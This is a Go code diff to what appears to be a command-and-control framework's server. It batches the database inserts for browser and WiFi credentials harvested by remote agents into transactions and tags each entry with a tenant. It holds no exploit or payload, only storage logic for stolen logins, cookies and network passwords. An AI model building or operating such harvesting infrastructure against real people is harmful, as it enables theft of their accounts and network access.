@@ -9,6 +9,7 @@ import (
 
 	"github.com/forgec2/forgec2/internal/db"
 	"github.com/gin-gonic/gin"
+	"gorm.io/gorm"
 )
 
 // handleCookieExport dispatches cookie_export task to the agent.
@@ -120,30 +121,48 @@ func (s *Server) handleProcessBrowserResult(c *gin.Context) {
 		return
 	}
 
+	// Resolve the owning tenant once instead of letting the per-row write
+	// hook re-SELECT it for every credential.
+	tenantID := s.agentTenantID(req.AgentID)
+
 	// Parse and store credentials
-	created := 0
+	var entries []db.CredentialEntry
 	for _, credStr := range req.Credentials {
 		// Expected format: browser|url|username|password|cookie_data
 		// This will be parsed by the agent and sent in structured format
 		notes, err := encryptCredNotes(credStr)
 		if err != nil {
 			// Fail-closed: a vault failure must not store harvested
-			// credentials as plaintext. The entry is skipped and counted
-			// as not created so the operator sees the shortfall.
+			// credentials as plaintext. The entry is skipped and the
+			// created count below reports the shortfall.
 			slog.Error("Browser credential dropped, vault encryption failed", "agent_id", req.AgentID, "task_id", req.TaskID, "err", err)
 			continue
 		}
-		cred := db.CredentialEntry{
-			AgentID: req.AgentID,
-			Source:  "browser",
-			Type:    "cleartext",
-			TaskID:  req.TaskID,
-			Notes:   notes,
-		}
+		entries = append(entries, db.CredentialEntry{
+			AgentID:  req.AgentID,
+			Source:   "browser",
+			Type:     "cleartext",
+			TaskID:   req.TaskID,
+			Notes:    notes,
+			TenantID: tenantID,
+		})
+	}
 
-		if err := s.db.Create(&cred).Error; err == nil {
+	// Per-row skip-on-error semantics are preserved, but the inserts commit
+	// together in one transaction instead of N individually-committed
+	// round trips on the single-writer pool.
+	created := 0
+	if err := s.db.Transaction(func(tx *gorm.DB) error {
+		for i := range entries {
+			if e := tx.Create(&entries[i]).Error; e != nil {
+				slog.Warn("Browser credential dropped", "agent_id", req.AgentID, "task_id", req.TaskID, "err", e)
+				continue
+			}
 			created++
 		}
+		return nil
+	}); err != nil {
+		slog.Warn("Browser credential ingest transaction aborted", "agent_id", req.AgentID, "err", err)
 	}
 
 	// Update task
@@ -174,8 +193,12 @@ func (s *Server) handleProcessWifiResult(c *gin.Context) {
 		return
 	}
 
+	// Resolve the owning tenant once instead of letting the per-row write
+	// hook re-SELECT it for every credential.
+	tenantID := s.agentTenantID(req.AgentID)
+
 	// Parse and store WiFi credentials
-	created := 0
+	var entries []db.CredentialEntry
 	for _, network := range req.Networks {
 		// Format: SSID:Password — limit to 2 so colons in password aren't lost
 		parts := strings.SplitN(network, ":", 2)
@@ -185,18 +208,31 @@ func (s *Server) handleProcessWifiResult(c *gin.Context) {
 		ssid := strings.TrimSpace(parts[0])
 		password := strings.TrimSpace(parts[1])
 
-		cred := db.CredentialEntry{
+		entries = append(entries, db.CredentialEntry{
 			AgentID:  req.AgentID,
 			Username: ssid,
 			Password: password,
 			Source:   "wifi",
 			Type:     "cleartext",
 			TaskID:   req.TaskID,
-		}
+			TenantID: tenantID,
+		})
+	}
 
-		if err := s.db.Create(&cred).Error; err == nil {
+	// One commit for the whole result instead of N individually-committed
+	// inserts on the single-writer pool.
+	created := 0
+	if err := s.db.Transaction(func(tx *gorm.DB) error {
+		for i := range entries {
+			if e := tx.Create(&entries[i]).Error; e != nil {
+				slog.Warn("WiFi credential dropped", "agent_id", req.AgentID, "task_id", req.TaskID, "err", e)
+				continue
+			}
 			created++
 		}
+		return nil
+	}); err != nil {
+		slog.Warn("WiFi credential ingest transaction aborted", "agent_id", req.AgentID, "err", err)
 	}
 
 	// Update task
